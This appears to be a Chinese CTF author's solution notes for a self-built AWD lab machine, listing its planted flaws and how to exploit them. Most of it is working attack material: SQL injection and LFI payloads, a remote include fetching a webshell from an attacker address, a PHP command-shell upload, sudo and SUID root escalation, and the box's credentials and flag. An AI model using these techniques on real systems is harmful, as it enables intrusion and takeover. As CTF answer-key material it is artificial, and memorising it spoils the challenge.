# AWD 模式攻击

## 凭证信息 (Credentials)

###### PS: (密码不是加密后的 hash ，用 hash 做的密码)
-   **Linux Root 用户:**
    ```
    T1: root:$1$DcI4hlB5$7Fzb9WR6XrBFwjHgBcpA61
    T2: root:$1$zu5fqmiV$hRUIt5Hp0LQwlBSDC5XuA0
    ```
-   **MySQL Root 用户:**
    ```
    T1: root:$1$0kRGbLi5$o1jTxIVwcDWSOcKtTLukM1
    T2: root:$1$xDRC88E9$NuBtIeH1q2Xndltvfk0Wu0
    ```
-   **Linux welcome 用户:**
    ```
    T1: welcome:welcome
    T2: welcome:welcome
    ```
-   **WEB admin 用户:**
    ```
    T1: admin:babygirl94andrew10
    T2: admin:jeanjeandianacarolina
    ```
## FTP 服务

-   允许匿名登录。
-   家目录在 /var/ftp/ 目录下, 有welcome的凭据。
```
welcome !!!
are you welcome???
Lazy boy!!!
```
## Web 目录权限 (`/var/www/html/`)

-   权限设置为 `777` (可读、可写、可执行)。
-   **利用方式:** 结合 FTP 匿名上传权限，可以直接上传 PHP Webshell (例如 `shell.php`) 到 Web 根目录，实现远程代码执行 (RCE)。

## Web robots.txt 文件
-   **提示信息:** 在 `robots.txt` 文件中可以找到以下内容：
    ```
    User-agent: *
    Disallow: /xxxxx
    ```
    之后你可以看到
    ```
    噢，防止我忘记密码，我把密码放在这里一份

    pw: xxxxxxxx
    ```
    xxxxxxxx 将是 admin 用户的密码

## Web PHP 代码漏洞
-   login.php: SQL 注入漏洞
```
POST /login.php
username=admin' -- -&password=anything
```

-   dashboard.php: 文件上传漏洞
```
POST /dashboard.php HTTP/1.1
这里是没有检查文件类型，并且可以执行上传的 php 代码。 
```

-   game.php: LFI 漏洞
```
/games.php?game=../../etc/passwd 
/games.php?game=php://filter/convert.base64-encode/resource=config.php
结合 php://filter-chains 技术可实现 RCE /games.php?game=(php://filter-chains链)
推荐项目: 
https://github.com/synacktiv/php_filter_chain_generator.git
https://github.com/DingTom23/php-reverse-chains.git
```

-   ball.php: RCE 漏洞
```
/ball.php?debug=1&cmd=id
```

-   memory.php: Remote LFI 漏洞
```
/memory.php?theme=http://youraddress/webshell.php
```

-   puzzle.php: SQL 注入漏洞
```
/puzzle.php?check_username=admin' OR '1'='1
/puzzle.php?check_username=admin' UNION SELECT 1,2,3,4,5,6 FROM information_schema.tables WHERE '1'='1
```

-   snake.php: 文件读写漏洞
```
读取文件: /snake.php?admin=super&file=/etc/passwd
写入文件: 
POST /snake.php?admin=super
Content-Type: application/x-www-form-urlencoded

filename=shell.php&content=<?php system($_GET['cmd']); ?>
```

-   typing.php: PHP伪协议漏洞
```
/typing.php?load_wordlist=php://filter/convert.base64-encode/resource=config.php
```

## `welcome` 用户密码复用

-   `welcome` 用户的 Linux 登录密码与其用户名相同，均为 `welcome`。
-   **提示信息:** 在 `/home/welcome/note.txt` 文件中可以找到以下内容：
    ```
    From root@localhost:

        朋友，你的密码太弱了，一旦知道你的用户名，不久知道密码了吗？

                        To welcome@localhost
    ```
    这暗示了 `welcome` 用户名和密码相同。

## /home/welcome/.bash_history 文件
-   `welcome` 用户的 Bash 历史记录文件 (`/home/welcome/.bash_history`) 中包含了一些敏感信息。
-   **提示信息:** 在 `/home/welcome/.bash_history` 文件中可以找到以下内容：
    ```
    su -
    $1$0kRGbLi5$o1jTxIVwcDWSOcKtTLukM1
    ```
    
## Sudo 滥用
-   www-data 用户:
```bash
root@dmsy-awd:~# sudo -u www-data sudo -l
Matching Defaults entries for www-data on dmsy-awd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dmsy-awd:
    (welcome) NOPASSWD: /usr/bin/vi
```
    可以 !bash 提权

-   welcome 用户:
```bash
root@dmsy-awd:~# sudo -u welcome sudo -l
[sudo] password for welcome: 
Matching Defaults entries for welcome on dmsy-awd:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on dmsy-awd:
    (ALL) PASSWD: /home/*/backup.sh, /bin/zip
```
#### 提权路径
```bash
welcome@dmsy-awd:~$ mv backup.sh backup.sh.bak
welcome@dmsy-awd:~$ echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > backup.sh
welcome@dmsy-awd:~$ chmod +x backup.sh
welcome@dmsy-awd:~$ ls -la /tmp/bash 
-rwsr-sr-x 1 root root 1168776 Apr 23 10:43 /tmp/bash
welcome@dmsy-awd:~$ /tmp/bash -p
bash-5.0# id
uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)

welcome@dmsy-awd:~$ TF=$(mktemp -u)
welcome@dmsy-awd:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
```

## SUID 提权
-   查找 SUID 可执行文件:

```bash
welcome@dmsy-awd:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/date
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/base64
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```
-  发现 data 和 base64 有 SUID 权限 

```bash
welcome@dmsy-awd:~$ LFILE=/root/root.txt
welcome@dmsy-awd:~$ date -f $LFILE
date: invalid date ‘flag{1998cbf9-1f88-11f0-a369-000c29094b2d}’

welcome@dmsy-awd:~$ base64 "$LFILE" | base64 -d
flag{1998cbf9-1f88-11f0-a369-000c29094b2d}
```

#### 后记
我靠，累死了，markdown 手写的，服务全部手搓。
幸好有伟大的 claude 给我写 php 代码，要不然我就死在这了。
要不然真的累死在这了。